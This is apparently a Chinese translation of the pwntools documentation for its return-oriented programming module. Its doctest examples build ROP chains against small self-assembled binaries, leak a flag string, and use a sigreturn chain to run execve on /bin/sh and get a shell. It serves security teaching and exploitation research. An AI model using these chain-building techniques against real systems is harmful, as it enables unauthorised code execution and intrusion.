.. testsetup:: *

   from pwn import *

:mod:`pwnlib.rop.rop` --- Return Oriented Programming
==========================================================

Return Oritented Programming

手工 ROP
------------

ROP工具可以被用来构造栈，而且是相当简单的。我们先创建一个假的binary，里面会有一些之后会用到的符号。

>>> context.clear(arch='i386')
>>> binary = ELF.from_assembly('add esp, 0x10; ret')
>>> binary.symbols = {'read': 0xdeadbeef, 'write': 0xdecafbad, 'exit': 0xfeedface}

创建ROP对象，并且从中查看相应的符号相当的容易。

>>> rop = ROP(binary)

通过使用ROP对象，我们可以很容易地添加栈帧。

>>> rop.raw(0)
>>> rop.raw(unpack('abcd'))
>>> rop.raw(2)

我们也可以以一种容易阅读的方式地查看ROP。

>>> print rop.dump()
0x0000:              0x0
0x0004:       0x64636261
0x0008:              0x2

ROP模块还知道如何使用标准的Linux API调用来生成函数调用。

>>> rop.call('read', [4,5,6])
>>> print rop.dump()
0x0000:              0x0
0x0004:       0x64636261
0x0008:              0x2
0x000c:       0xdeadbeef read(4, 5, 6)
0x0010:           'eaaa' <pad>
0x0014:              0x4 arg0
0x0018:              0x5 arg1
0x001c:              0x6 arg2

我们也可以使用简写的模式。ROP中的栈会自动为下一个栈帧进行调节。

>>> rop.write(7,8,9)
>>> rop.exit()
>>> print rop.dump()
0x0000:              0x0
0x0004:       0x64636261
0x0008:              0x2
0x000c:       0xdeadbeef read(4, 5, 6)
0x0010:       0x10000000 <adjust: add esp, 0x10; ret>
0x0014:              0x4 arg0
0x0018:              0x5 arg1
0x001c:              0x6 arg2
0x0020:           'iaaa' <pad>
0x0024:       0xdecafbad write(7, 8, 9)
0x0028:       0x10000000 <adjust: add esp, 0x10; ret>
0x002c:              0x7 arg0
0x0030:              0x8 arg1
0x0034:              0x9 arg2
0x0038:           'oaaa' <pad>
0x003c:       0xfeedface exit()
0x0040:           'qaaa' <pad>

ROP 例子
------------
假设我们拥有一个不重要的binary，他就仅仅是读取一些数据到栈上，然后返回。


>>> context.clear(arch='i386')
>>> c = constants
>>> assembly =  'read:'      + shellcraft.read(c.STDIN_FILENO, 'esp', 1024)
>>> assembly += 'ret\n'

同时我们来提供一些简单的gadgets：

>>> assembly += 'add_esp: add esp, 0x10; ret\n'

以及一个很好的写函数。

>>> assembly += 'write: enter 0,0\n'
>>> assembly += '    mov ebx, [ebp+4+4]\n'
>>> assembly += '    mov ecx, [ebp+4+8]\n'
>>> assembly += '    mov edx, [ebp+4+12]\n'
>>> assembly += shellcraft.write('ebx', 'ecx', 'edx')
>>> assembly += '    leave\n'
>>> assembly += '    ret\n'
>>> assembly += 'flag: .asciz "The flag"\n'

以及一个正常退出的方式。

>>> assembly += 'exit: ' + shellcraft.exit(0)
>>> binary   = ELF.from_assembly(assembly)

最后，我们来构建我们的ROP攻击。

>>> rop = ROP(binary)
>>> rop.write(c.STDOUT_FILENO, binary.symbols['flag'], 8)
>>> rop.exit()
>>> print rop.dump()
0x0000:       0x10000012 write(STDOUT_FILENO, 268435494, 8)
0x0004:       0x1000000e <adjust: add esp, 0x10; ret>
0x0008:              0x1 arg0
0x000c:       0x10000026 flag
0x0010:              0x8 arg2
0x0014:           'faaa' <pad>
0x0018:       0x1000002f exit()
0x001c:           'haaa' <pad>

我们还可以通过str来获取ROP栈上的原始数据。

>>> raw_rop = str(rop)
>>> print enhex(raw_rop)
120000100e000010010000002600001008000000666161612f00001068616161

让我们来试一下

>>> p = process(binary.path)
>>> p.send(raw_rop)
>>> print p.recvall(timeout=5)
The flag

ROP+SigReturn

有时候，我们并不能够找到我们所希望控制的寄存器的指令。然而，如果你可以控制stack，EAX，并且找到了一个int 0x80的gadget，你就可以使用sigreturn。

有时候这个甚至可以自动化攻击。

下面我们给出一个样例中，在这个样子中，我们向栈上读取一些数据。

>>> context.clear(arch='i386')
>>> c = constants
>>> assembly =  'read:'      + shellcraft.read(c.STDIN_FILENO, 'esp', 1024)
>>> assembly += 'ret\n'
>>> assembly += 'pop eax; ret\n'
>>> assembly += 'int 0x80\n'
>>> assembly += 'binsh: .asciz "/bin/sh"'
>>> binary    = ELF.from_assembly(assembly)

之后，我们生成一个ROP对象，并且进行函数调用。

>>> context.kernel = 'amd64'
>>> rop   = ROP(binary)
>>> binsh = binary.symbols['binsh']
>>> rop.execve(binsh, 0, 0)

这就是它的所有内容了。

>>> print rop.dump()
0x0000:       0x1000000e pop eax; ret
0x0004:             0x77
0x0008:       0x1000000b int 0x80
0x000c:              0x0 gs
0x0010:              0x0 fs
0x0014:              0x0 es
0x0018:              0x0 ds
0x001c:              0x0 edi
0x0020:              0x0 esi
0x0024:              0x0 ebp
0x0028:              0x0 esp
0x002c:       0x10000012 ebx = binsh
0x0030:              0x0 edx
0x0034:              0x0 ecx
0x0038:              0xb eax
0x003c:              0x0 trapno
0x0040:              0x0 err
0x0044:       0x1000000b int 0x80
0x0048:             0x23 cs
0x004c:              0x0 eflags
0x0050:              0x0 esp_at_signal
0x0054:             0x2b ss
0x0058:              0x0 fpstate

下面，我们来试一试吧。

>>> p = process(binary.path)
>>> p.send(str(rop))
>>> time.sleep(1)
>>> p.sendline('echo hello; exit')
>>> p.recvline()
'hello\n'


``class pwnlib.rop.rop.ROP(elfs, base=None, **kwargs)``

这个类简化了ROP链的生成。

例子如下：

elf = ELF('ropasaurusrex')
rop = ROP(elf)
rop.read(0, elf.bss(0x80))
rop.dump()
# ['0x0000:        0x80482fc (read)',
#  '0x0004:       0xdeadbeef',
#  '0x0008:              0x0',
#  '0x000c:        0x80496a8']
str(rop)
# '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'


>>> context.clear(arch = "i386", kernel = 'amd64')
>>> assembly = 'int 0x80; ret; add esp, 0x10; ret; pop eax; ret'
>>> e = ELF.from_assembly(assembly)
>>> e.symbols['funcname'] = e.address + 0x1234
>>> r = ROP(e)
>>> r.funcname(1, 2)
>>> r.funcname(3)
>>> r.execve(4, 5, 6)
>>> print r.dump()
0x0000:       0x10001234 funcname(1, 2)
0x0004:       0x10000003 <adjust: add esp, 0x10; ret>
0x0008:              0x1 arg0
0x000c:              0x2 arg1
0x0010:           'eaaa' <pad>
0x0014:           'faaa' <pad>
0x0018:       0x10001234 funcname(3)
0x001c:       0x10000007 <adjust: pop eax; ret>
0x0020:              0x3 arg0
0x0024:       0x10000007 pop eax; ret
0x0028:             0x77
0x002c:       0x10000000 int 0x80
0x0030:              0x0 gs
0x0034:              0x0 fs
0x0038:              0x0 es
0x003c:              0x0 ds
0x0040:              0x0 edi
0x0044:              0x0 esi
0x0048:              0x0 ebp
0x004c:              0x0 esp
0x0050:              0x4 ebx
0x0054:              0x6 edx
0x0058:              0x5 ecx
0x005c:              0xb eax
0x0060:              0x0 trapno
0x0064:              0x0 err
0x0068:       0x10000000 int 0x80
0x006c:             0x23 cs
0x0070:              0x0 eflags
0x0074:              0x0 esp_at_signal
0x0078:             0x2b ss
0x007c:              0x0 fpstate



>>> r = ROP(e, 0x8048000)
>>> r.funcname(1, 2)
>>> r.funcname(3)
>>> r.execve(4, 5, 6)
>>> print r.dump()
0x8048000:       0x10001234 funcname(1, 2)
0x8048004:       0x10000003 <adjust: add esp, 0x10; ret>
0x8048008:              0x1 arg0
0x804800c:              0x2 arg1
0x8048010:           'eaaa' <pad>
0x8048014:           'faaa' <pad>
0x8048018:       0x10001234 funcname(3)
0x804801c:       0x10000007 <adjust: pop eax; ret>
0x8048020:              0x3 arg0
0x8048024:       0x10000007 pop eax; ret
0x8048028:             0x77
0x804802c:       0x10000000 int 0x80
0x8048030:              0x0 gs
0x8048034:              0x0 fs
0x8048038:              0x0 es
0x804803c:              0x0 ds
0x8048040:              0x0 edi
0x8048044:              0x0 esi
0x8048048:              0x0 ebp
0x804804c:        0x8048080 esp
0x8048050:              0x4 ebx
0x8048054:              0x6 edx
0x8048058:              0x5 ecx
0x804805c:              0xb eax
0x8048060:              0x0 trapno
0x8048064:              0x0 err
0x8048068:       0x10000000 int 0x80
0x804806c:             0x23 cs
0x8048070:              0x0 eflags
0x8048074:              0x0 esp_at_signal
0x8048078:             0x2b ss
0x804807c:              0x0 fpstate

参数: elfs(list):需要处理的elf对象列表。


